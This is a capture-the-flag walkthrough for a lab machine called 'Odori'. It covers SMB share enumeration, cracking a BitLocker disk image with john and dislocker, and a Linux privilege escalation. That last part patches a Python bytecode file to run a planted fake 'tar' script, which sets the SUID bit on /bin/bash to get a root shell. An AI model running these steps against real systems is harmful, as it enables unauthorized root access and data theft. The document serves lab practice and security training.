# Odori — Penetration Testing / CTF Notes

> **Environment:** Authorized CTF / lab environment  
> **Target observed in the notes:** `10.129.234.54`  
> **Hostname:** `ODORI`  
> **Primary services:** SSH, SMB  
> **Focus:** SMB enumeration, backup discovery, BitLocker image analysis, and Linux privilege escalation

---

## 1. Initial Enumeration

### 1.1 Port and service scan

```bash
nmap -p 22,139,445 --min-rate=1000 -sC -sV 10.129.234.54
```

**Observed services:**

| Port | State | Service | Version / Notes |
|---|---|---|---|
| 22/tcp | Open | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 |
| 139/tcp | Open | NetBIOS-SSN | Samba smbd 4 |
| 445/tcp | Open | SMB | Samba smbd 4 |

Additional observations:

- NetBIOS name: `ODORI`
- SMB dialect: 3.1.1
- SMB message signing: enabled, but not required
- The target was identified as a Linux host.

---

## 2. SMB Enumeration

### 2.1 List available shares

```bash
smbclient -L 10.129.234.54
```

**Discovered shares:**

| Share | Type | Comment |
|---|---|---|
| `print$` | Disk | Printer Drivers |
| `backup` | Disk | Server Backups |
| `IPC$` | IPC | IPC Service |

The SMB1 workgroup-listing negotiation returned an error. However, the `backup` share was accessible, so enumeration continued directly against that share.

### 2.2 Connect to the backup share

```bash
smbclient //10.129.234.54/backup
```

Inside the SMB prompt:

```text
ls
get info.txt
```

The share contained `info.txt` (66 bytes), which was downloaded successfully.

To read the downloaded file:

```bash
cat info.txt
```

> **Evidence note:** The supplied terminal excerpt confirms the file was downloaded, but does not include the contents of `info.txt`. Add the relevant, non-sensitive finding here after reviewing the file.

---

## 3. BitLocker Image Analysis

> This section records the disk-image workflow from the supplied terminal notes. Confirm that the image and target belong to the same authorized lab before combining evidence from different stages.

### 3.1 Convert the VMDK image to RAW

```bash
qemu-img convert -O raw /mnt/d/rev/odori/file02.vmdk file02.raw
```

### 3.2 Extract BitLocker metadata

```bash
bitlocker2john -i file02.raw > hash
cat hash
```

### 3.3 Attempt to recover the BitLocker password

```bash
john --format=bitlocker --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Check John the Ripper's result:

```bash
john --show --format=bitlocker hash
```

> **Result status:** The supplied command shows an attempt to crack the BitLocker hash. The provided excerpt does not show a recovered password, so do not mark the password as cracked unless `john --show` confirms it.

### 3.4 Attach the RAW image and inspect partitions

```bash
sudo losetup -Pf --show file02.raw
lsblk
```

The recorded loop device was `/dev/loop0`. The partition selected for BitLocker access was `/dev/loop0p3`; `/dev/loop0p2` returned a volume-header parsing error.

### 3.5 Unlock and mount the BitLocker volume

```bash
sudo mkdir -p /media/bitlocker /media/mount
sudo dislocker -V /dev/loop0p3 -u'123456789' -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/mount
```

The NTFS volume mounted read-only because it was reported as unclean. The files could still be inspected.

```bash
ls -la /media/mount/
ls -la /media/mount/Scripts/
cat /media/mount/Scripts/backup.ps1
```

The `backup.ps1` script was successfully inspected. It referenced:

- Source directory: `C:\data`
- SMB destination: `\\odori.vl\backup`
- An SFTP configuration

**Credential handling:** Do not publish passwords, private keys, tokens, or other secrets in a public GitHub repository. Redact them from screenshots and writeups.

### 3.6 Cleanup

After finishing the disk analysis:

```bash
sudo umount /media/mount
sudo umount /media/bitlocker 2>/dev/null
sudo losetup -d /dev/loop0
```

If a mount is busy, close shells or processes using the mount point before retrying.

---

## 4. Linux Privilege Escalation

> The following commands document the privilege-escalation sequence shown in the supplied notes. Run them only in the authorized lab.

### 4.1 Redirect the archiver's `tar` path

```bash
sed -i 's|/usr/bin/tar|/tmp/bin/tar|' /opt/archiver/__pycache__/helper.cpython-310.pyc
```

This modifies a compiled Python bytecode file so the referenced `tar` path points to `/tmp/bin/tar`.

### 4.2 Create the replacement `tar` script

```bash
mkdir -p /tmp/bin/

cat > /tmp/bin/tar <<'EOF'
#!/bin/bash
chmod u+s /bin/bash
EOF

chmod +x /tmp/bin/tar
```

### 4.3 Set the timestamp on the trigger file

```bash
touch -d '2015-08-09 13:38:36.000000000 +0000' /backup/ancient
```

The supplied notes show this timestamp being applied to `/backup/ancient`. The excerpt does not include the archiver execution or its trigger condition, so document those steps only after confirming them in the lab.

### 4.4 Verify the Bash SUID bit

```bash
ls -l /bin/bash
```

If the exploit succeeds, the permissions should show the SUID bit (for example, `-rwsr-xr-x`). The supplied notes show the verification command but do not include its output.

### 4.5 Attempt a privileged Bash shell

```bash
/bin/bash -p
```

Inside the shell, verify the effective identity:

```bash
id
whoami
```

**Success criterion:** Confirm elevated privileges using `id` (for example, `euid=0(root)`) before documenting the privilege escalation as successful.

---

## 5. Command Reference

| Task | Command |
|---|---|
| Scan target services | `nmap -p 22,139,445 --min-rate=1000 -sC -sV 10.129.234.54` |
| Enumerate SMB shares | `smbclient -L 10.129.234.54` |
| Connect to backup share | `smbclient //10.129.234.54/backup` |
| Download share file | `get info.txt` |
| Convert VMDK to RAW | `qemu-img convert -O raw /mnt/d/rev/odori/file02.vmdk file02.raw` |
| Extract BitLocker hash | `bitlocker2john -i file02.raw > hash` |
| Run BitLocker wordlist attempt | `john --format=bitlocker --wordlist=/usr/share/wordlists/rockyou.txt hash` |
| Show John result | `john --show --format=bitlocker hash` |
| Attach image | `sudo losetup -Pf --show file02.raw` |
| Inspect partitions | `lsblk` |
| Inspect mounted files | `ls -la /media/mount/` |
| Verify Bash permissions | `ls -l /bin/bash` |
| Start privileged Bash mode | `/bin/bash -p` |
| Verify current identity | `id` |

---

## 6. Findings and Evidence Checklist

Before publishing the final writeup, add evidence for the following:

- [ ] Nmap output showing the discovered services.
- [ ] SMB share listing showing the `backup` share.
- [ ] `info.txt` contents, with secrets redacted.
- [ ] BitLocker cracking result (`john --show`).
- [ ] Partition layout (`lsblk`).
- [ ] Successful BitLocker mount and relevant file listing.
- [ ] Relevant `backup.ps1` findings, with credentials redacted.
- [ ] Evidence that the archiver trigger ran.
- [ ] `/bin/bash` permissions showing the SUID bit.
- [ ] `id` output confirming the final privilege level.

## 7. Notes on Evidence Integrity

The supplied excerpts contain commands from multiple stages, but do not show every command's output. In particular:

- The BitLocker John command is an attempt; a recovered password is not demonstrated in the supplied excerpt.
- The SMB `info.txt` download is confirmed, but its contents were not included.
- The final SUID verification and `id` output were not included.
- The initial SMB scan uses `10.129.234.54`. Keep this target separate from any other IP address appearing in earlier notes unless you verify they refer to the same lab instance.

Only claim a step as successful when its output or resulting evidence confirms it.

---

## Disclaimer

This document is for educational purposes and authorized CTF/lab practice only. Do not use these techniques against systems without explicit permission.
